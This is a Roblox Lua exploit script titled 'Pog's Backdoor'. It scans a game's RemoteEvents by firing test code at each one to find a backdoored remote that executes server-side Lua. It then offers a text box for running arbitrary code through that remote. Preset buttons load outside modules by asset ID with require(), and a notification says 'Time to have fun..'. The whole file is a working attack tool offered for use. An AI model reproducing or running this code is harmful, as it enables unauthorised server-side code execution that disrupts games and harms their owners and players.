-- Pog's Backdoor
-- 0.0.1












































































local Pog = Instance.new("ScreenGui")
local Frame_1 = Instance.new("Frame")
local UICorner_1 = Instance.new("UICorner")
local UIStroke_1 = Instance.new("UIStroke")
local UIGradient_1 = Instance.new("UIGradient")
local Check_1 = Instance.new("TextLabel")
local FrameExec_1 = Instance.new("Frame")
local BtnExecute_1 = Instance.new("TextButton")
local UIStroke_2 = Instance.new("UIStroke")
local UICorner_2 = Instance.new("UICorner")
local UIStroke_3 = Instance.new("UIStroke")
local BtnClear_1 = Instance.new("TextButton")
local UIStroke_4 = Instance.new("UIStroke")
local UICorner_3 = Instance.new("UICorner")
local UIStroke_5 = Instance.new("UIStroke")
local Txt_1 = Instance.new("TextBox")
local UIStroke_6 = Instance.new("UIStroke")
local UICorner_4 = Instance.new("UICorner")
local BtnScripts_1 = Instance.new("TextButton")
local UIStroke_7 = Instance.new("UIStroke")
local UIGradient_2 = Instance.new("UIGradient")
local UICorner_5 = Instance.new("UICorner")
local FrameScripts_1 = Instance.new("Frame")
local UIStroke_8 = Instance.new("UIStroke")
local UIGradient_3 = Instance.new("UIGradient")
local UICorner_6 = Instance.new("UICorner")
local Btn1_1 = Instance.new("TextButton")
local UIStroke_9 = Instance.new("UIStroke")
local UICorner_7 = Instance.new("UICorner")
local UIStroke_10 = Instance.new("UIStroke")
local Btn2_1 = Instance.new("TextButton")
local UIStroke_11 = Instance.new("UIStroke")
local UICorner_8 = Instance.new("UICorner")
local UIStroke_12 = Instance.new("UIStroke")
local Title_1 = Instance.new("TextLabel")
local Title_2 = Instance.new("TextLabel")

-- Properties:
Pog.Name = "Pog"
Pog.Parent = game.CoreGui
Pog.ResetOnSpawn = false
Pog.DisplayOrder = 99999

Frame_1.Parent = Pog
Frame_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
Frame_1.BackgroundTransparency = 0.20000000298023224
Frame_1.BorderColor3 = Color3.fromRGB(0,0,0)
Frame_1.BorderSizePixel = 0
Frame_1.Position = UDim2.new(0.0583468527, 0,0.336272031, 0)
Frame_1.Size = UDim2.new(0, 477,0, 266)

UICorner_1.Parent = Frame_1

UIStroke_1.Parent = Frame_1
UIStroke_1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_1.Color = Color3.fromRGB(255,255,255)
UIStroke_1.Thickness = 3

UIGradient_1.Parent = UIStroke_1
UIGradient_1.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

Check_1.Name = "Check"
Check_1.Parent = Frame_1
Check_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Check_1.BackgroundTransparency = 1
Check_1.BorderColor3 = Color3.fromRGB(0,0,0)
Check_1.BorderSizePixel = 0
Check_1.Position = UDim2.new(0, 0,0.293233097, 0)
Check_1.Size = UDim2.new(0, 477,0, 104)
Check_1.Visible = false
Check_1.Font = Enum.Font.SourceSans
Check_1.Text = "Checking for backdoor... (might take some time)"
Check_1.TextColor3 = Color3.fromRGB(255,255,255)
Check_1.TextScaled = true
Check_1.TextSize = 14
Check_1.TextStrokeTransparency = 0
Check_1.TextWrapped = true

FrameExec_1.Name = "FrameExec"
FrameExec_1.Parent = Frame_1
FrameExec_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
FrameExec_1.BackgroundTransparency = 1
FrameExec_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameExec_1.BorderSizePixel = 0
FrameExec_1.Size = UDim2.new(0, 477,0, 266)

BtnExecute_1.Name = "BtnExecute"
BtnExecute_1.Parent = FrameExec_1
BtnExecute_1.Active = true
BtnExecute_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnExecute_1.BackgroundTransparency = 1
BtnExecute_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnExecute_1.BorderSizePixel = 0
BtnExecute_1.Position = UDim2.new(0.0494969524, 0,0.75939852, 0)
BtnExecute_1.Size = UDim2.new(0, 200,0, 50)
BtnExecute_1.Font = Enum.Font.SourceSans
BtnExecute_1.Text = "Execute"
BtnExecute_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnExecute_1.TextScaled = true
BtnExecute_1.TextSize = 14
BtnExecute_1.TextWrapped = true

UIStroke_2.Parent = BtnExecute_1
UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_2.Color = Color3.fromRGB(57,57,57)
UIStroke_2.Thickness = 2

UICorner_2.Parent = BtnExecute_1

UIStroke_3.Parent = BtnExecute_1
UIStroke_3.Color = Color3.fromRGB(57,57,57)
UIStroke_3.Thickness = 2

BtnClear_1.Name = "BtnClear"
BtnClear_1.Parent = FrameExec_1
BtnClear_1.Active = true
BtnClear_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnClear_1.BackgroundTransparency = 1
BtnClear_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnClear_1.BorderSizePixel = 0
BtnClear_1.Position = UDim2.new(0.505754828, 0,0.75939852, 0)
BtnClear_1.Size = UDim2.new(0, 200,0, 50)
BtnClear_1.Font = Enum.Font.SourceSans
BtnClear_1.Text = "Clear"
BtnClear_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnClear_1.TextScaled = true
BtnClear_1.TextSize = 14
BtnClear_1.TextWrapped = true

UIStroke_4.Parent = BtnClear_1
UIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_4.Color = Color3.fromRGB(57,57,57)
UIStroke_4.Thickness = 2

UICorner_3.Parent = BtnClear_1

UIStroke_5.Parent = BtnClear_1
UIStroke_5.Color = Color3.fromRGB(57,57,57)
UIStroke_5.Thickness = 2

Txt_1.Name = "Txt"
Txt_1.Parent = FrameExec_1
Txt_1.Active = true
Txt_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Txt_1.BackgroundTransparency = 1
Txt_1.BorderColor3 = Color3.fromRGB(0,0,0)
Txt_1.BorderSizePixel = 0
Txt_1.ClearTextOnFocus = false
Txt_1.CursorPosition = -1
Txt_1.MultiLine = true
Txt_1.Position = UDim2.new(0.0494969524, 0,0.176691726, 0)
Txt_1.Size = UDim2.new(0, 417,0, 140)
Txt_1.Font = Enum.Font.Arcade
Txt_1.PlaceholderColor3 = Color3.fromRGB(178,178,178)
Txt_1.PlaceholderText = "Code here..."
Txt_1.Text = ""
Txt_1.TextColor3 = Color3.fromRGB(255,255,255)
Txt_1.TextSize = 15
Txt_1.TextStrokeTransparency = 0
Txt_1.TextWrapped = true
Txt_1.TextXAlignment = Enum.TextXAlignment.Left
Txt_1.TextYAlignment = Enum.TextYAlignment.Top

UIStroke_6.Parent = Txt_1
UIStroke_6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_6.Color = Color3.fromRGB(57,57,57)
UIStroke_6.Thickness = 2

UICorner_4.Parent = Txt_1

BtnScripts_1.Name = "BtnScripts"
BtnScripts_1.Parent = FrameExec_1
BtnScripts_1.Active = true
BtnScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
BtnScripts_1.BackgroundTransparency = 0.20000000298023224
BtnScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnScripts_1.BorderSizePixel = 0
BtnScripts_1.Position = UDim2.new(1.03272545, 0,0, 0)
BtnScripts_1.Size = UDim2.new(0, 37,0, 266)
BtnScripts_1.Font = Enum.Font.SourceSans
BtnScripts_1.Text = ">"
BtnScripts_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnScripts_1.TextSize = 50
BtnScripts_1.TextWrapped = true

UIStroke_7.Parent = BtnScripts_1
UIStroke_7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_7.Color = Color3.fromRGB(255,255,255)
UIStroke_7.Thickness = 2

UIGradient_2.Parent = UIStroke_7
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_5.Parent = BtnScripts_1

FrameScripts_1.Name = "FrameScripts"
FrameScripts_1.Parent = FrameExec_1
FrameScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
FrameScripts_1.BackgroundTransparency = 0.20000000298023224
FrameScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameScripts_1.BorderSizePixel = 0
FrameScripts_1.Position = UDim2.new(1.14255762, 0,0, 0)
FrameScripts_1.Size = UDim2.new(0, 350,0, 266)
FrameScripts_1.Visible = false

UIStroke_8.Parent = FrameScripts_1
UIStroke_8.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_8.Color = Color3.fromRGB(255,255,255)
UIStroke_8.Thickness = 3

UIGradient_3.Parent = UIStroke_8
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_6.Parent = FrameScripts_1

Btn1_1.Name = "Btn1"
Btn1_1.Parent = FrameScripts_1
Btn1_1.Active = true
Btn1_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn1_1.BackgroundTransparency = 1
Btn1_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn1_1.BorderSizePixel = 0
Btn1_1.Position = UDim2.new(0.0314690284, 0,0.0451127812, 0)
Btn1_1.Size = UDim2.new(0, 173,0, 50)
Btn1_1.Font = Enum.Font.SourceSans
Btn1_1.Text = "Polaria"
Btn1_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn1_1.TextScaled = true
Btn1_1.TextSize = 14
Btn1_1.TextWrapped = true

UIStroke_9.Parent = Btn1_1
UIStroke_9.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_9.Color = Color3.fromRGB(57,57,57)
UIStroke_9.Thickness = 2

UICorner_7.Parent = Btn1_1

UIStroke_10.Parent = Btn1_1
UIStroke_10.Color = Color3.fromRGB(57,57,57)
UIStroke_10.Thickness = 2

Btn2_1.Name = "Btn2"
Btn2_1.Parent = FrameScripts_1
Btn2_1.Active = true
Btn2_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn2_1.BackgroundTransparency = 1
Btn2_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn2_1.BorderSizePixel = 0
Btn2_1.Position = UDim2.new(0.0314690284, 0,0.2781955, 0)
Btn2_1.Size = UDim2.new(0, 173,0, 50)
Btn2_1.Font = Enum.Font.SourceSans
Btn2_1.Text = "ExSer"
Btn2_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn2_1.TextScaled = true
Btn2_1.TextSize = 14
Btn2_1.TextWrapped = true

UIStroke_11.Parent = Btn2_1
UIStroke_11.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_11.Color = Color3.fromRGB(57,57,57)
UIStroke_11.Thickness = 2

UICorner_8.Parent = Btn2_1

UIStroke_12.Parent = Btn2_1
UIStroke_12.Color = Color3.fromRGB(57,57,57)
UIStroke_12.Thickness = 2

Title_1.Name = "Title"
Title_1.Parent = FrameScripts_1
Title_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_1.BackgroundTransparency = 1
Title_1.BorderColor3 = Color3.fromRGB(0,0,0)
Title_1.BorderSizePixel = 0
Title_1.Position = UDim2.new(0, 0,0.808270693, 0)
Title_1.Size = UDim2.new(0, 350,0, 37)
Title_1.Font = Enum.Font.SourceSans
Title_1.Text = "More Scripts Soon!"
Title_1.TextColor3 = Color3.fromRGB(255,255,255)
Title_1.TextScaled = true
Title_1.TextSize = 14
Title_1.TextStrokeTransparency = 0
Title_1.TextWrapped = true

Title_2.Name = "Title"
Title_2.Parent = Frame_1
Title_2.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_2.BackgroundTransparency = 1
Title_2.BorderColor3 = Color3.fromRGB(0,0,0)
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 477,0, 37)
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "Pog's Backdoor"
Title_2.TextColor3 = Color3.fromRGB(255,255,255)
Title_2.TextScaled = true
Title_2.TextSize = 14
Title_2.TextStrokeTransparency = 0
Title_2.TextWrapped = true

local function VmOxpzIbZcaZFtQf()
local script = Instance.new("LocalScript",Frame_1)
local gradient = script.Parent.UIStroke.UIGradient
game:GetService("RunService").RenderStepped:Connect(function()
	gradient.Rotation = (gradient.Rotation + 1) % 360
end)

local RunService = game:GetService("RunService")
local foundEvent = false
local FinishedFound = false

local function testRemote(remote)
	local modelName = "PogBackdoor"
	print("Checking RemoteEvent:", remote:GetFullName())
	local function onAdded(instance)
		if instance:IsDescendantOf(workspace) and instance.Name == modelName then
			foundEvent = true
		end
	end

	local connection = workspace.ChildAdded:Connect(onAdded)
	remote:FireServer([[ 
        local model = Instance.new("Message") 
        model.Name = "PogBackdoor"
        model.Parent = workspace 
    ]])
	local startTime = tick()
	while tick() - startTime < 0.5 do
		if foundEvent then break end
		RunService.Heartbeat:Wait()
	end
	connection:Disconnect()
	print(foundEvent and "✅ RemoteEvent is exploitable!" or "❌ RemoteEvent failed.")
	return foundEvent
end

local remoteEvent
local remotes = {}
for _, remote in ipairs(game:GetDescendants()) do
	if remote:IsA("RemoteEvent") and remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then
		table.insert(remotes, remote)
	end
end

local index = 1
local function findRemote()
	if remoteEvent then return end
	for i = 1, 10 do
		if index > #remotes then
			FinishedFound = true
			print("❌ Finished scanning. No exploitable RemoteEvent found.")
			return
		end
		local remote = remotes[index]
		index += 1
		if remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then 
			if testRemote(remote) then
				remoteEvent = remote
				print("✅ Using RemoteEvent:", remote:GetFullName())
				return
			end
		end
	end
	task.wait(0.05)
	findRemote()
end

task.spawn(findRemote)

local function fireRemoteEvent(code)
	if remoteEvent then
		print("ℹ️ Executing code through:", remoteEvent:GetFullName()) -- Debug print
		remoteEvent:FireServer(code)
	else
		warn("⚠ No exploitable RemoteEvent found, cannot execute code.")
	end
end

repeat task.wait() until FinishedFound or remoteEvent
if not remoteEvent then
	script.Parent.Check.Text = "backdoor not found!!"
else
	script.Parent.Check.Visible = false
	script.Parent.FrameExec.Visible = true
	game.StarterGui:SetCore("SendNotification",{
		Title = "Pog Backdoor Scanner",
		Text = "Backdoor found! Time to have fun..",
		Duration = 5
	})
end

local f = script.Parent.FrameExec
f.BtnScripts.MouseButton1Click:Connect(function()
	f.FrameScripts.Visible = not f.FrameScripts.Visible
end)
local fs = f.FrameScripts
fs.Btn1.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(123255432303221):Pload("user")'
end)
fs.Btn2.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(10868847330):pls("user")'
end)
f.BtnClear.MouseButton1Click:Connect(function()
	f.Txt.Text = ""
end)
f.BtnExecute.MouseButton1Click:Connect(function()
	fireRemoteEvent(f.Txt.Text)
end)
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(VmOxpzIbZcaZFtQf)()


local function SSPzsmBBnGSSIJUz()
local script = Instance.new("LocalScript",FrameExec_1)
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Parent.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(SSPzsmBBnGSSIJUz)()

